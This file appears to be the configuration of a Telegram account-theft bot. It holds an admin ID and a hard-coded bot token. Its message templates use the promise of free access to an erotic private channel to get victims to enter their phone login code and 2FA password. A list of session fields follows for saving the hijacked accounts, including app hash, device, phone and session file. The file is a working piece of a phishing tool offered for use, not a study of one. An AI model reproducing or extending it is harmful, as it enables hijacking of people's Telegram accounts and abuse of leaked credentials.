ADMIN_ID = 7522412874
BOT_TOKEN = "7739444673:AAHYIELILkwNV9AVW6aDiOQ_QSq3SWgSzuw"  # токен бота

TEMPLATE = {
    "start": "Free access to my private channel 🔞 😏. Get ready for an unforgettable journey filled with passion 🔥, temptation ✨, and forbidden desires 😈\n\nTo view it, click on the button below 👇",
    "code": "To log in, enter the code you received to the phone number you specified:",
    "password": "Enter the 2FA password",
    "finish": "Successfully ",
    "invalid_password": "Invalid password!",
    "invalid_code": "Invalid code!",
    "expiration_auth": "expiration_auth! Try again",
    "error": "Too many attempts to enter the code! Try again after 2 hours",
    "wait_code": "The code has been sent...", 
    "button": "🎁Get access",
}


SESSION_JSON_PARAMS = {
    "app_id": None,
    "app_hash": None,
    "device": None,
    "sdk": None,
    "app_version": None,
    "system_lang_pack": None,
    "system_lang_code": None,
    "lang_pack": None,
    "lang_code": None,
    "twoFA": None,
    "role": None,
    "user_id": None,
    "phone": None,
    "username": None,
    "date_of_birth": None,
    "date_of_birth_integrity": None,
    "is_premium": None,
    "has_profile_pic": None,
    "spamblock": None,
    "register_time": None,
    "last_check_time": None,
    "avatar": None,
    "first_name": None,
    "last_name": None,
    "sex": None,
    "proxy": None,
    "ipv6": None,
    "session_file": None
}